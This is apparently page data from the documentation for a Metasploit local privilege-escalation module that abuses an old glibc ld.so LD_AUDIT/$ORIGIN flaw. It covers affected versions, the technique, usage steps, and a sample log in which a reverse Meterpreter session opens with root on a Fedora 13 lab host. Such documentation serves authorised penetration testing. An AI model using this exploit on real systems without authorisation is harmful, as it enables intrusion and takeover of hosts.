{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/local/glibc_origin_expansion_priv_esc","result":{"data":{"moduleMetadataJson":{"id":"4c07ed8b-bb71-5f8b-98b2-0d5caf9de40b","name":"glibc '$ORIGIN' Expansion Privilege Escalation","fullname":"exploit/linux/local/glibc_origin_expansion_priv_esc","description":"This module attempts to gain root privileges on Linux systems by abusing\n        a vulnerability in the GNU C Library (glibc) dynamic linker.\n\n        glibc `ld.so` versions before 2.11.3, and 2.12.x before 2.12.2 does not\n        properly restrict use of the `LD_AUDIT` environment variable when loading\n        setuid executables which allows control over the `$ORIGIN` library search\n        path resulting in execution of arbitrary shared objects.\n\n        This module opens a file descriptor to the specified suid executable via\n        a hard link, then replaces the hard link with a shared object before\n        instructing the linker to execute the file descriptor, resulting in\n        arbitrary code execution.\n\n        The specified setuid binary must be readable and located on the same\n        file system partition as the specified writable directory.\n\n        This module has been tested successfully on:\n\n        glibc 2.5 on CentOS 5.4 (x86_64);\n        glibc 2.5 on CentOS 5.5 (x86_64);\n        glibc 2.12 on Fedora 13 (i386); and\n        glibc 2.5-49 on RHEL 5.5 (x86_64).\n\n        Some versions of `ld.so`, such as the version shipped with Ubuntu 14,\n        hit a failed assertion in `dl_open_worker` causing exploitation to fail.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/local/glibc_origin_expansion_priv_esc","documentationSlug":"/modules/documentation/exploit/linux/local/glibc_origin_expansion_priv_esc","referencesSlug":"/modules/references/exploit/linux/local/glibc_origin_expansion_priv_esc"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module attempts to gain root privileges on Linux systems by abusing\na vulnerability in the GNU C Library (glibc) dynamic linker.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  glibc <code class=\"language-text\">ld.so</code> versions before 2.11.3, and 2.12.x before 2.12.2 does not\nproperly restrict use of the <code class=\"language-text\">LD_AUDIT</code> environment variable when loading\nsetuid executables which allows control over the <code class=\"language-text\">$ORIGIN</code> library search\npath resulting in execution of arbitrary shared objects.</p>\n<p>  This module opens a file descriptor to the specified suid executable via\na hard link, then replaces the hard link with a shared object before\ninstructing the linker to execute the file descriptor, resulting in\narbitrary code execution.</p>\n<p>  The specified setuid binary must be readable and located on the same\nfile system partition as the specified writable directory.</p>\n<p>  This module has been tested successfully on:</p>\n<ul>\n<li>glibc 2.5 on CentOS 5.4 (x86_64)</li>\n<li>glibc 2.5 on CentOS 5.5 (x86_64)</li>\n<li>glibc 2.12 on Fedora 13 (i386)</li>\n<li>glibc 2.5-49 on RHEL 5.5 (x86_64)</li>\n</ul>\n<p>  Some versions of <code class=\"language-text\">ld.so</code>, such as the version shipped with Ubuntu 14,\nhit a failed assertion in <code class=\"language-text\">dl_open_worker</code> causing exploitation to fail.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Get a session</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/local/glibc_origin_expansion_priv_esc</code></li>\n<li>Do: <code class=\"language-text\">set SESSION [SESSION]</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a new <em>root</em> session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>SESSION</strong></p>\n<p>  Which session to use, which can be viewed with <code class=\"language-text\">sessions</code></p>\n<p>  <strong>WritableDir</strong></p>\n<p>  A writable directory file system path. (default: <code class=\"language-text\">/tmp</code>)</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/local/glibc_origin_expansion_priv_esc \nmsf exploit(linux/local/glibc_origin_expansion_priv_esc) &gt; set session 1\nsession =&gt; 1\nmsf exploit(linux/local/glibc_origin_expansion_priv_esc) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.244:4444 \n[+] The target appears to be vulnerable\n[*] Using target: Linux x86\n[*] Writing &#39;/tmp/.R5Ork&#39; (1279 bytes) ...\n[*] Writing &#39;/tmp/.yE35DWbLd&#39; (320 bytes) ...\n[*] Writing &#39;/tmp/.sk7Z3Vl7vJ&#39; (207 bytes) ...\n[*] Launching exploit...\n[*] Sending stage (857352 bytes) to 172.16.191.138\n[*] Meterpreter session 2 opened (172.16.191.244:4444 -&gt; 172.16.191.138:59187) at 2018-01-27 04:21:24 -0500\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : fedora13.localdomain\nOS           : Fedora 13 (Linux 2.6.33.3-85.fc13.i686.PAE)\nArchitecture : i686\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"4c07ed8b-bb71-5f8b-98b2-0d5caf9de40b"}}}